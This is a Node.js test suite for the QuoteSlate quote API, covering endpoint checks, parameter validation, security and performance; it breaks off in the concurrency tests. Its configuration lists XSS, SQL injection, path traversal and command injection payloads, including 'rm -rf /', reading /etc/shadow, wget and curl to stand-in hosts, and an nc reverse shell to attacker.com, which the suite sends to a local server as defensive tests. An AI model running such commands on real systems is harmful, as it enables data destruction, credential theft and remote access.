#!/usr/bin/env node

/**
 * QuoteSlate API - Comprehensive Test Suite
 * 
 * A complete, all-in-one test suite that covers every aspect of the QuoteSlate API.
 * This single file contains all tests from basic functionality to advanced security testing.
 * 
 * Test Coverage:
 * - Basic functionality (health, endpoints, data validation)
 * - Parameter validation (all edge cases and boundary values)
 * - Security vulnerabilities (XSS, SQL injection, command injection, path traversal)
 * - Performance and load testing
 * - HTTP protocol compliance
 * - Error handling and edge cases
 * - Rate limiting behavior
 * - Fuzzing and stress testing
 * - Data consistency validation
 * 
 * Usage:
 *   node tests/comprehensive.test.js
 *   npm run test:comprehensive
 * 
 * @author Musheer Alam (Musheer360)
 * @version 3.0.0 - Consolidated Edition
 */

const http = require('http');
const { performance } = require('perf_hooks');

// =============================================================================
// CONFIGURATION
// =============================================================================

const CONFIG = {
  BASE_URL: 'http://localhost:3000',
  HOSTNAME: 'localhost',
  PORT: 3000,
  TIMEOUT: {
    NORMAL: 5000,
    LONG: 30000,
    VERY_LONG: 60000
  },
  SECURITY: {
    XSS_PAYLOADS: [
      '<script>alert("xss")</script>',
      'javascript:alert("xss")',
      '<img src=x onerror=alert("xss")>',
      '"><script>alert("xss")</script>',
      "'><script>alert('xss')</script>",
      '<svg onload=alert("xss")>',
      '<iframe src="javascript:alert(\'xss\')">',
      '<body onload=alert("xss")>',
      '<input onfocus=alert("xss") autofocus>',
      '<select onfocus=alert("xss") autofocus>',
      '<textarea onfocus=alert("xss") autofocus>',
      '<keygen onfocus=alert("xss") autofocus>',
      '<video><source onerror="alert(\'xss\')">',
      '<audio src=x onerror=alert("xss")>',
      '<details open ontoggle=alert("xss")>',
      '<marquee onstart=alert("xss")>',
      '\\u003cscript\\u003ealert("xss")\\u003c/script\\u003e',
      '%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E'
    ],
    SQL_INJECTION_PAYLOADS: [
      "'; DROP TABLE quotes; --",
      "' OR '1'='1",
      "' OR 1=1 --",
      "' UNION SELECT * FROM quotes --",
      "'; DELETE FROM quotes; --",
      "' OR 'a'='a",
      "1' OR '1'='1' --",
      "admin'--",
      "admin'/*",
      "' OR 1=1#",
      "' OR 1=1/*",
      "') OR '1'='1--",
      "') OR ('1'='1--",
      "1; DROP TABLE quotes",
      "1'; DROP TABLE quotes; --",
      "'; INSERT INTO quotes VALUES ('hacked'); --"
    ],
    COMMAND_INJECTION_PAYLOADS: [
      "; ls -la",
      "| cat /etc/passwd",
      "&& rm -rf /",
      "; cat /etc/shadow",
      "| whoami",
      "; id",
      "&& cat /proc/version",
      "; uname -a",
      "| ps aux",
      "; netstat -an",
      "&& curl evil.com",
      "; wget malicious.com/script.sh",
      "| nc -e /bin/sh attacker.com 4444",
      "; python -c 'import os; os.system(\"ls\")'",
      "&& node -e 'require(\"child_process\").exec(\"ls\")'"
    ],
    PATH_TRAVERSAL_PAYLOADS: [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd",
      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
      "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
      "/var/www/../../etc/passwd",
      "....\\\\....\\\\....\\\\etc\\\\passwd"
    ]
  }
};

// =============================================================================
// TEST RESULT TRACKING
// =============================================================================

class TestResults {
  constructor() {
    this.categories = new Map();
    this.startTime = Date.now();
    this.performanceMetrics = {
      totalRequests: 0,
      totalResponseTime: 0,
      minResponseTime: Infinity,
      maxResponseTime: 0,
      timeouts: 0,
      errors: 0
    };
  }

  addCategory(name) {
    if (!this.categories.has(name)) {
      this.categories.set(name, {
        passed: 0,
        failed: 0,
        failures: []
      });
    }
  }

  recordTest(category, testName, passed, details = '', responseTime = 0) {
    this.addCategory(category);
    const cat = this.categories.get(category);
    
    if (passed) {
      cat.passed++;
      console.log(`✅ ${testName}`);
    } else {
      cat.failed++;
      cat.failures.push({ testName, details });
      console.log(`❌ ${testName} - ${details}`);
    }

    if (responseTime > 0) {
      this.performanceMetrics.totalRequests++;
      this.performanceMetrics.totalResponseTime += responseTime;
      this.performanceMetrics.minResponseTime = Math.min(this.performanceMetrics.minResponseTime, responseTime);
      this.performanceMetrics.maxResponseTime = Math.max(this.performanceMetrics.maxResponseTime, responseTime);
    }
  }

  getTotals() {
    let totalPassed = 0, totalFailed = 0;
    for (const [name, results] of this.categories) {
      totalPassed += results.passed;
      totalFailed += results.failed;
    }
    return { totalPassed, totalFailed };
  }

  printSummary() {
    const endTime = Date.now();
    const duration = endTime - this.startTime;
    const { totalPassed, totalFailed } = this.getTotals();
    const total = totalPassed + totalFailed;
    const successRate = total > 0 ? ((totalPassed / total) * 100).toFixed(2) : 0;

    console.log('\n' + '='.repeat(80));
    console.log('🎯 COMPREHENSIVE TEST RESULTS SUMMARY');
    console.log('='.repeat(80));
    
    console.log(`\n📊 OVERALL STATISTICS:`);
    console.log(`   ✅ Passed: ${totalPassed}`);
    console.log(`   ❌ Failed: ${totalFailed}`);
    console.log(`   📈 Total: ${total}`);
    console.log(`   🎯 Success Rate: ${successRate}%`);
    console.log(`   ⏱️  Duration: ${(duration / 1000).toFixed(2)}s`);

    if (this.performanceMetrics.totalRequests > 0) {
      const avgResponseTime = this.performanceMetrics.totalResponseTime / this.performanceMetrics.totalRequests;
      console.log(`\n⚡ PERFORMANCE METRICS:`);
      console.log(`   📡 Total Requests: ${this.performanceMetrics.totalRequests}`);
      console.log(`   ⏱️  Average Response Time: ${avgResponseTime.toFixed(2)}ms`);
      console.log(`   🚀 Fastest Response: ${this.performanceMetrics.minResponseTime.toFixed(2)}ms`);
      console.log(`   🐌 Slowest Response: ${this.performanceMetrics.maxResponseTime.toFixed(2)}ms`);
    }

    console.log(`\n📋 CATEGORY BREAKDOWN:`);
    for (const [name, results] of this.categories) {
      const categoryTotal = results.passed + results.failed;
      const categorySuccess = categoryTotal > 0 ? ((results.passed / categoryTotal) * 100).toFixed(1) : 0;
      console.log(`   ${name}: ${results.passed}✅ ${results.failed}❌ (${categorySuccess}%)`);
    }

    if (totalFailed > 0) {
      console.log(`\n❌ DETAILED FAILURE REPORT:`);
      for (const [name, results] of this.categories) {
        if (results.failures.length > 0) {
          console.log(`\n   ${name}:`);
          results.failures.forEach((failure, index) => {
            console.log(`     ${index + 1}. ${failure.testName}`);
            if (failure.details) {
              console.log(`        Details: ${failure.details}`);
            }
          });
        }
      }
    }

    console.log('\n' + '='.repeat(80));
    
    if (totalFailed === 0) {
      console.log('🎉 ALL TESTS PASSED! API is bulletproof and production-ready! 🚀');
      return true;
    } else {
      console.log(`💥 ${totalFailed} tests failed. API needs attention before production deployment.`);
      return false;
    }
  }
}

// =============================================================================
// HTTP CLIENT
// =============================================================================

class HttpClient {
  constructor() {
    this.requestCount = 0;
  }

  async makeRequest(path, options = {}) {
    const requestId = ++this.requestCount;
    const startTime = performance.now();
    
    const requestOptions = {
      hostname: CONFIG.HOSTNAME,
      port: CONFIG.PORT,
      path: path,
      method: options.method || 'GET',
      timeout: options.timeout || CONFIG.TIMEOUT.NORMAL,
      headers: options.headers || {}
    };

    return new Promise((resolve, reject) => {
      const req = http.request(requestOptions, (res) => {
        let body = '';
        
        res.on('data', (chunk) => {
          body += chunk;
        });
        
        res.on('end', () => {
          const endTime = performance.now();
          const responseTime = endTime - startTime;
          
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            body: body,
            responseTime: responseTime,
            requestId: requestId
          });
        });
      });

      req.on('error', (err) => {
        reject(err);
      });

      req.on('timeout', () => {
        req.destroy();
        reject(new Error(`Request timeout after ${requestOptions.timeout}ms`));
      });

      if (options.body) {
        req.write(options.body);
      }

      req.end();
    });
  }

  async makeConcurrentRequests(requests, maxConcurrency = 10) {
    const results = [];
    const executing = [];

    for (const request of requests) {
      const promise = this.makeRequest(request.path, request.options).then(result => {
        executing.splice(executing.indexOf(promise), 1);
        return { ...result, originalRequest: request };
      });

      results.push(promise);
      executing.push(promise);

      if (executing.length >= maxConcurrency) {
        await Promise.race(executing);
      }
    }

    return Promise.all(results);
  }
}

// =============================================================================
// DATA GENERATORS
// =============================================================================

class DataGenerator {
  static randomString(length = 10) {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += charset.charAt(Math.floor(Math.random() * charset.length));
    }
    return result;
  }

  static randomNumber(min = 0, max = 1000000) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }

  static maliciousStrings() {
    return [
      ...CONFIG.SECURITY.XSS_PAYLOADS,
      ...CONFIG.SECURITY.SQL_INJECTION_PAYLOADS,
      ...CONFIG.SECURITY.COMMAND_INJECTION_PAYLOADS,
      ...CONFIG.SECURITY.PATH_TRAVERSAL_PAYLOADS,
      'null', 'undefined', 'NaN', 'Infinity', '-Infinity',
      '\\x00', '\\u0000', String.fromCharCode(0),
      ''.padStart(1000, 'A'), // Very long string
      '🚀💥🎉🔥⚡🌟💯🎯🚨⭐', // Emojis
      'مرحبا', '你好', 'Здравствуйте', 'こんにちは' // International
    ];
  }

  static boundaryValues() {
    return {
      integers: [-2147483648, 2147483647, 0, 1, -1, Number.MAX_SAFE_INTEGER, Number.MIN_SAFE_INTEGER],
      strings: ['', ' ', '\t', '\n', '\r', '\0', 'a', 'A', '0', '1']
    };
  }
}

// =============================================================================
// GLOBAL SETUP
// =============================================================================

const testResults = new TestResults();
const httpClient = new HttpClient();

module.exports = { CONFIG, TestResults, HttpClient, DataGenerator, testResults, httpClient };
// =============================================================================
// BASIC FUNCTIONALITY TESTS
// =============================================================================

async function runBasicTests() {
  console.log('\n🔧 BASIC FUNCTIONALITY TESTS');
  console.log('='.repeat(50));

  // Health endpoint tests
  try {
    const response = await httpClient.makeRequest('/health');
    testResults.recordTest('BASIC', 'Health endpoint accessible', response.statusCode === 200, '', response.responseTime);
    
    let healthData;
    try {
      healthData = JSON.parse(response.body);
      testResults.recordTest('BASIC', 'Health endpoint returns valid JSON', true);
    } catch (e) {
      testResults.recordTest('BASIC', 'Health endpoint returns valid JSON', false, 'Invalid JSON response');
      return;
    }

    testResults.recordTest('BASIC', 'Health status is healthy', healthData.status === 'healthy');
    testResults.recordTest('BASIC', 'Health endpoint has version', !!healthData.version);
    testResults.recordTest('BASIC', 'Health endpoint has timestamp', !!healthData.timestamp);
    testResults.recordTest('BASIC', 'Health endpoint has features array', Array.isArray(healthData.features));
  } catch (error) {
    testResults.recordTest('BASIC', 'Health endpoint accessible', false, error.message);
  }

  // Random quote endpoint tests
  try {
    const response = await httpClient.makeRequest('/api/quotes/random');
    testResults.recordTest('BASIC', 'Random quote endpoint accessible', response.statusCode === 200, '', response.responseTime);
    
    let quoteData;
    try {
      quoteData = JSON.parse(response.body);
      testResults.recordTest('BASIC', 'Random quote returns valid JSON', true);
    } catch (e) {
      testResults.recordTest('BASIC', 'Random quote returns valid JSON', false, 'Invalid JSON response');
      return;
    }

    testResults.recordTest('BASIC', 'Quote has id field', typeof quoteData.id === 'number');
    testResults.recordTest('BASIC', 'Quote has quote field', typeof quoteData.quote === 'string');
    testResults.recordTest('BASIC', 'Quote has author field', typeof quoteData.author === 'string');
    testResults.recordTest('BASIC', 'Quote has length field', typeof quoteData.length === 'number');
    testResults.recordTest('BASIC', 'Quote has tags field', Array.isArray(quoteData.tags));
    testResults.recordTest('BASIC', 'Quote length matches text length', quoteData.length === quoteData.quote.length);
    testResults.recordTest('BASIC', 'Quote ID is positive', quoteData.id > 0);
    testResults.recordTest('BASIC', 'Quote length is positive', quoteData.length > 0);
    testResults.recordTest('BASIC', 'Tags array contains strings', quoteData.tags.every(tag => typeof tag === 'string'));
  } catch (error) {
    testResults.recordTest('BASIC', 'Random quote endpoint accessible', false, error.message);
  }

  // Authors endpoint tests
  try {
    const response = await httpClient.makeRequest('/api/authors');
    testResults.recordTest('BASIC', 'Authors endpoint accessible', response.statusCode === 200, '', response.responseTime);
    
    let authorsData;
    try {
      authorsData = JSON.parse(response.body);
      testResults.recordTest('BASIC', 'Authors endpoint returns valid JSON', true);
    } catch (e) {
      testResults.recordTest('BASIC', 'Authors endpoint returns valid JSON', false, 'Invalid JSON response');
      return;
    }

    testResults.recordTest('BASIC', 'Authors is an object', typeof authorsData === 'object' && !Array.isArray(authorsData));
    testResults.recordTest('BASIC', 'Authors object has entries', Object.keys(authorsData).length > 0);
    
    // Test a few specific authors
    const testAuthors = ['A. A. Milne', 'A. P. J. Abdul Kalam', 'A. Powell Davies', 'Abigail Adams', 'Abigail Van Buren'];
    testAuthors.forEach(author => {
      testResults.recordTest('BASIC', `Author "${author}" has valid count`, 
        authorsData[author] && typeof authorsData[author] === 'number' && authorsData[author] > 0);
    });
  } catch (error) {
    testResults.recordTest('BASIC', 'Authors endpoint accessible', false, error.message);
  }

  // Tags endpoint tests
  try {
    const response = await httpClient.makeRequest('/api/tags');
    testResults.recordTest('BASIC', 'Tags endpoint accessible', response.statusCode === 200, '', response.responseTime);
    
    let tagsData;
    try {
      tagsData = JSON.parse(response.body);
      testResults.recordTest('BASIC', 'Tags endpoint returns valid JSON', true);
    } catch (e) {
      testResults.recordTest('BASIC', 'Tags endpoint returns valid JSON', false, 'Invalid JSON response');
      return;
    }

    testResults.recordTest('BASIC', 'Tags is an array', Array.isArray(tagsData));
    testResults.recordTest('BASIC', 'Tags array has entries', tagsData.length > 0);
    testResults.recordTest('BASIC', 'All tags are strings', tagsData.every(tag => typeof tag === 'string'));
    testResults.recordTest('BASIC', 'No empty tags', tagsData.every(tag => tag.length > 0));
    testResults.recordTest('BASIC', 'No duplicate tags', new Set(tagsData).size === tagsData.length);
  } catch (error) {
    testResults.recordTest('BASIC', 'Tags endpoint accessible', false, error.message);
  }

  // Paginated quotes endpoint tests
  try {
    const response = await httpClient.makeRequest('/api/quotes?page=1&limit=10');
    testResults.recordTest('BASIC', 'Paginated quotes endpoint accessible', response.statusCode === 200, '', response.responseTime);
    
    let paginatedData;
    try {
      paginatedData = JSON.parse(response.body);
      testResults.recordTest('BASIC', 'Paginated quotes returns valid JSON', true);
    } catch (e) {
      testResults.recordTest('BASIC', 'Paginated quotes returns valid JSON', false, 'Invalid JSON response');
      return;
    }

    testResults.recordTest('BASIC', 'Has data array', Array.isArray(paginatedData.data));
    testResults.recordTest('BASIC', 'Has pagination object', typeof paginatedData.pagination === 'object');
    testResults.recordTest('BASIC', 'Returns correct number of quotes', paginatedData.data.length === 10);
    testResults.recordTest('BASIC', 'Pagination has required fields', 
      paginatedData.pagination.hasOwnProperty('page') && 
      paginatedData.pagination.hasOwnProperty('limit') && 
      paginatedData.pagination.hasOwnProperty('total'));
  } catch (error) {
    testResults.recordTest('BASIC', 'Paginated quotes endpoint accessible', false, error.message);
  }
}

// =============================================================================
// PARAMETER VALIDATION TESTS
// =============================================================================

async function runParameterValidationTests() {
  console.log('\n🔍 PARAMETER VALIDATION TESTS');
  console.log('='.repeat(50));

  // Count parameter tests
  const countTests = [
    { value: '0', shouldFail: true, description: 'Zero count' },
    { value: '-1', shouldFail: true, description: 'Negative count' },
    { value: '1', shouldFail: false, description: 'Valid count 1' },
    { value: '50', shouldFail: false, description: 'Valid count 50' },
    { value: '51', shouldFail: true, description: 'Count above maximum' },
    { value: '1.5', shouldFail: true, description: 'Decimal count' },
    { value: 'abc', shouldFail: true, description: 'Non-numeric count' },
    { value: '', shouldFail: false, description: 'Empty count (should default)' },
    { value: ' ', shouldFail: true, description: 'Whitespace count' },
    { value: '1e10', shouldFail: true, description: 'Scientific notation count' },
    { value: 'Infinity', shouldFail: true, description: 'Infinity count' },
    { value: 'NaN', shouldFail: true, description: 'NaN count' },
    { value: '0x10', shouldFail: true, description: 'Hexadecimal count' },
    { value: '010', shouldFail: false, description: 'Octal-looking count' },
    { value: '+5', shouldFail: false, description: 'Count with plus sign' },
    { value: '  5  ', shouldFail: false, description: 'Count with whitespace' },
    { value: '5.0', shouldFail: true, description: 'Count with .0' },
    { value: '0005', shouldFail: false, description: 'Count with multiple zeros' }
  ];

  for (const test of countTests) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes/random?count=${encodeURIComponent(test.value)}`);
      const passed = test.shouldFail ? response.statusCode === 400 : response.statusCode === 200;
      testResults.recordTest('VALIDATION', `Count parameter: ${test.description}`, passed, 
        `Expected ${test.shouldFail ? 'failure' : 'success'}, got ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('VALIDATION', `Count parameter: ${test.description}`, test.shouldFail, error.message);
    }
  }

  // Page parameter tests
  const pageTests = [
    { value: '0', shouldFail: true, description: 'Zero page' },
    { value: '-1', shouldFail: true, description: 'Negative page' },
    { value: '1', shouldFail: false, description: 'Valid page 1' },
    { value: '999999', shouldFail: false, description: 'Very high page number' },
    { value: '1.5', shouldFail: true, description: 'Decimal page' },
    { value: 'abc', shouldFail: true, description: 'Text page' }
  ];

  for (const test of pageTests) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?page=${encodeURIComponent(test.value)}&limit=10`);
      const passed = test.shouldFail ? response.statusCode === 400 : response.statusCode === 200;
      testResults.recordTest('VALIDATION', `Page parameter: ${test.description}`, passed, 
        `Expected ${test.shouldFail ? 'failure' : 'success'}, got ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('VALIDATION', `Page parameter: ${test.description}`, test.shouldFail, error.message);
    }
  }

  // Limit parameter tests
  const limitTests = [
    { value: '0', shouldFail: true, description: 'Zero limit' },
    { value: '1', shouldFail: false, description: 'Minimum valid limit' },
    { value: '100', shouldFail: false, description: 'Maximum valid limit' },
    { value: '101', shouldFail: true, description: 'Limit above maximum' },
    { value: '-1', shouldFail: true, description: 'Negative limit' }
  ];

  for (const test of limitTests) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?page=1&limit=${encodeURIComponent(test.value)}`);
      const passed = test.shouldFail ? response.statusCode === 400 : response.statusCode === 200;
      testResults.recordTest('VALIDATION', `Limit parameter: ${test.description}`, passed, 
        `Expected ${test.shouldFail ? 'failure' : 'success'}, got ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('VALIDATION', `Limit parameter: ${test.description}`, test.shouldFail, error.message);
    }
  }

  // Length parameter tests
  const lengthTests = [
    { minLength: '0', maxLength: '100', shouldFail: true, description: 'Zero minimum length' },
    { minLength: '100', maxLength: '50', shouldFail: true, description: 'Min greater than max' },
    { minLength: '50', maxLength: '100', shouldFail: false, description: 'Valid length range' },
    { minLength: '-1', maxLength: '100', shouldFail: true, description: 'Negative minimum length' },
    { minLength: '50', maxLength: '-1', shouldFail: true, description: 'Negative maximum length' },
    { minLength: '50.5', maxLength: '100', shouldFail: true, description: 'Decimal minimum length' },
    { minLength: '50', maxLength: '100.5', shouldFail: true, description: 'Decimal maximum length' }
  ];

  for (const test of lengthTests) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?minLength=${test.minLength}&maxLength=${test.maxLength}&limit=10`);
      const passed = test.shouldFail ? response.statusCode === 400 : response.statusCode === 200;
      testResults.recordTest('VALIDATION', `Length parameters: ${test.description}`, passed, 
        `Expected ${test.shouldFail ? 'failure' : 'success'}, got ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('VALIDATION', `Length parameters: ${test.description}`, test.shouldFail, error.message);
    }
  }

  // Author parameter tests
  const authorTests = [
    { value: 'Albert Einstein', shouldFail: false, description: 'Valid author' },
    { value: 'NonExistentAuthor123', shouldFail: true, description: 'Non-existent author' },
    { value: '', shouldFail: true, description: 'Empty author' },
    { value: '   ', shouldFail: true, description: 'Whitespace-only author' },
    { value: 'A'.repeat(300), shouldFail: true, description: 'Very long author name' },
    { value: 'Albert%20Einstein', shouldFail: false, description: 'URL-encoded author' }
  ];

  for (const test of authorTests) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes/by-author/${encodeURIComponent(test.value)}`);
      const passed = test.shouldFail ? (response.statusCode === 400 || response.statusCode === 404) : response.statusCode === 200;
      testResults.recordTest('VALIDATION', `Author parameter: ${test.description}`, passed, 
        `Expected ${test.shouldFail ? 'failure' : 'success'}, got ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('VALIDATION', `Author parameter: ${test.description}`, test.shouldFail, error.message);
    }
  }

  // Tag parameter tests
  const tagTests = [
    { value: 'motivation', shouldFail: false, description: 'Valid tag' },
    { value: 'nonexistenttag123', shouldFail: true, description: 'Non-existent tag' },
    { value: '', shouldFail: true, description: 'Empty tag' },
    { value: '   ', shouldFail: true, description: 'Whitespace-only tag' },
    { value: 'A'.repeat(200), shouldFail: true, description: 'Very long tag' }
  ];

  for (const test of tagTests) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes/by-tag/${encodeURIComponent(test.value)}`);
      const passed = test.shouldFail ? (response.statusCode === 400 || response.statusCode === 404) : response.statusCode === 200;
      testResults.recordTest('VALIDATION', `Tag parameter: ${test.description}`, passed, 
        `Expected ${test.shouldFail ? 'failure' : 'success'}, got ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('VALIDATION', `Tag parameter: ${test.description}`, test.shouldFail, error.message);
    }
  }

  // Search parameter tests
  const searchTests = [
    { value: 'love', shouldFail: false, description: 'Valid search term' },
    { value: '', shouldFail: false, description: 'Empty search (should return all)' },
    { value: 'A'.repeat(600), shouldFail: true, description: 'Search term too long' },
    { value: 'life wisdom', shouldFail: false, description: 'Multi-word search' },
    { value: '12345', shouldFail: false, description: 'Numeric search' },
    { value: 'life!@#$%', shouldFail: false, description: 'Special characters search' }
  ];

  for (const test of searchTests) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?search=${encodeURIComponent(test.value)}&limit=10`);
      const passed = test.shouldFail ? response.statusCode === 400 : response.statusCode === 200;
      testResults.recordTest('VALIDATION', `Search parameter: ${test.description}`, passed, 
        `Expected ${test.shouldFail ? 'failure' : 'success'}, got ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('VALIDATION', `Search parameter: ${test.description}`, test.shouldFail, error.message);
    }
  }

  // Sort parameter tests
  const sortTests = [
    { value: 'id', shouldFail: false, description: 'Valid sort by id' },
    { value: 'author', shouldFail: false, description: 'Valid sort by author' },
    { value: 'length', shouldFail: false, description: 'Valid sort by length' },
    { value: 'random', shouldFail: false, description: 'Valid sort by random' },
    { value: 'invalid', shouldFail: false, description: 'Invalid sort (should default)' },
    { value: '', shouldFail: false, description: 'Empty sort (should default)' }
  ];

  for (const test of sortTests) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?sort=${encodeURIComponent(test.value)}&limit=10`);
      const passed = test.shouldFail ? response.statusCode === 400 : response.statusCode === 200;
      testResults.recordTest('VALIDATION', `Sort parameter: ${test.description}`, passed, 
        `Expected ${test.shouldFail ? 'failure' : 'success'}, got ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('VALIDATION', `Sort parameter: ${test.description}`, test.shouldFail, error.message);
    }
  }

  // Order parameter tests
  const orderTests = [
    { value: 'asc', shouldFail: false, description: 'Valid ascending order' },
    { value: 'desc', shouldFail: false, description: 'Valid descending order' },
    { value: 'invalid', shouldFail: false, description: 'Invalid order (should default)' },
    { value: '', shouldFail: false, description: 'Empty order (should default)' }
  ];

  for (const test of orderTests) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?order=${encodeURIComponent(test.value)}&limit=10`);
      const passed = test.shouldFail ? response.statusCode === 400 : response.statusCode === 200;
      testResults.recordTest('VALIDATION', `Order parameter: ${test.description}`, passed, 
        `Expected ${test.shouldFail ? 'failure' : 'success'}, got ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('VALIDATION', `Order parameter: ${test.description}`, test.shouldFail, error.message);
    }
  }
}
// =============================================================================
// SECURITY VULNERABILITY TESTS
// =============================================================================

async function runSecurityTests() {
  console.log('\n🛡️ SECURITY VULNERABILITY TESTS');
  console.log('='.repeat(50));

  // XSS injection tests
  console.log('\n🚨 Testing XSS Injection Attempts...');
  for (const payload of CONFIG.SECURITY.XSS_PAYLOADS) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?search=${encodeURIComponent(payload)}&limit=1`);
      const passed = response.statusCode === 400 || (response.statusCode === 200 && !response.body.includes('<script>'));
      testResults.recordTest('SECURITY', `XSS injection blocked: ${payload.substring(0, 30)}...`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('SECURITY', `XSS injection blocked: ${payload.substring(0, 30)}...`, true, 'Request failed (good)');
    }
  }

  // SQL injection tests
  console.log('\n💉 Testing SQL Injection Attempts...');
  for (const payload of CONFIG.SECURITY.SQL_INJECTION_PAYLOADS) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?search=${encodeURIComponent(payload)}&limit=1`);
      const passed = response.statusCode === 400 || (response.statusCode === 200 && !response.body.includes('error'));
      testResults.recordTest('SECURITY', `SQL injection blocked: ${payload.substring(0, 30)}...`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('SECURITY', `SQL injection blocked: ${payload.substring(0, 30)}...`, true, 'Request failed (good)');
    }
  }

  // Command injection tests
  console.log('\n⚡ Testing Command Injection Attempts...');
  for (const payload of CONFIG.SECURITY.COMMAND_INJECTION_PAYLOADS) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?search=${encodeURIComponent(payload)}&limit=1`);
      // Accept 400 (validation blocked), 404 (endpoint blocked), or 200 (allowed but safe)
      const passed = response.statusCode === 400 || response.statusCode === 404 || (response.statusCode === 200 && !response.body.includes('root:'));
      testResults.recordTest('SECURITY', `Command injection blocked: ${payload.substring(0, 30)}...`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('SECURITY', `Command injection blocked: ${payload.substring(0, 30)}...`, true, 'Request failed (good)');
    }
  }

  // Path traversal tests
  console.log('\n📁 Testing Path Traversal Attempts...');
  for (const payload of CONFIG.SECURITY.PATH_TRAVERSAL_PAYLOADS) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?search=${encodeURIComponent(payload)}&limit=1`);
      const passed = response.statusCode === 400 || (response.statusCode === 200 && !response.body.includes('root:'));
      testResults.recordTest('SECURITY', `Path traversal blocked: ${payload.substring(0, 30)}...`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('SECURITY', `Path traversal blocked: ${payload.substring(0, 30)}...`, true, 'Request failed (good)');
    }
  }

  // Security headers tests
  console.log('\n🔒 Testing Security Headers...');
  try {
    const response = await httpClient.makeRequest('/api/quotes/random');
    testResults.recordTest('SECURITY', 'X-Content-Type-Options header present', 
      !!response.headers['x-content-type-options']);
    testResults.recordTest('SECURITY', 'X-Frame-Options header present', 
      !!response.headers['x-frame-options']);
    testResults.recordTest('SECURITY', 'X-XSS-Protection header present', 
      !!response.headers['x-xss-protection']);
    testResults.recordTest('SECURITY', 'Content-Type header present', 
      !!response.headers['content-type']);
  } catch (error) {
    testResults.recordTest('SECURITY', 'Security headers test', false, error.message);
  }

  // Unicode handling tests
  console.log('\n🌐 Testing Malicious Unicode Characters...');
  const unicodePayloads = [
    '\u202e', // Right-to-left override
    '\u200b', // Zero width space
    '\ufeff', // Byte order mark
    '\u0000', // Null character
    '\u001f', // Unit separator
    '\u007f', // Delete character
    '\u0080', // Padding character
    '\u009f', // Application program command
    '\ud800\udc00', // Surrogate pair
    '\uffff\ufffe' // Non-characters
  ];

  for (const payload of unicodePayloads) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?search=${encodeURIComponent(payload)}&limit=1`);
      const passed = response.statusCode === 200 || response.statusCode === 400;
      testResults.recordTest('SECURITY', `Unicode handling: ${payload.length} chars`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('SECURITY', `Unicode handling: ${payload.length} chars`, true, 'Request failed (acceptable)');
    }
  }

  // HTTP header injection tests
  console.log('\n📡 Testing HTTP Header Injection...');
  const headerInjectionPayloads = [
    'test\nX-Injected: true',
    'test\rX-Injected: true',
    'test%0d%0aX-Injected: true',
    'test%0aX-Injected: true'
  ];

  for (const payload of headerInjectionPayloads) {
    try {
      const response = await httpClient.makeRequest(`/api/quotes?search=${encodeURIComponent(payload)}&limit=1`);
      const passed = !response.headers['x-injected'];
      testResults.recordTest('SECURITY', `Header injection blocked: ${payload.substring(0, 30)}...`, passed, 
        `Status: ${response.statusCode}`, response.responseTime);
    } catch (error) {
      testResults.recordTest('SECURITY', `Header injection blocked: ${payload.substring(0, 30)}...`, true, 'Request failed (good)');
    }
  }
}

// =============================================================================
// PERFORMANCE & LOAD TESTS
// =============================================================================

async function runPerformanceTests() {
  console.log('\n⚡ PERFORMANCE & LOAD TESTS');
  console.log('='.repeat(50));

  // Response time tests
  console.log('\n⏱️ Testing Response Times...');
  const performanceEndpoints = [
    '/api/quotes/random',
    '/api/quotes?page=1&limit=10',
    '/api/authors',
    '/api/tags',
    '/api/quotes/by-author/Albert%20Einstein',
    '/api/quotes/by-tag/motivation'
  ];

  for (const endpoint of performanceEndpoints) {
    try {
      const response = await httpClient.makeRequest(endpoint);
      const passed = response.responseTime < 1000; // Under 1 second
      testResults.recordTest('PERFORMANCE', `Response time ${endpoint}`, passed, 
        `${response.responseTime.toFixed(2)}ms`, response.responseTime);
    } catch (error) {
      testResults.recordTest('PERFORMANCE', `Response time ${endpoint}`, false, error.message);
    }
  }

  // Concurrent request tests
  console.log('\n🔄 Testing Concurrent Requests...');
  const concurrencyLevels = [5, 10, 25, 50];
  
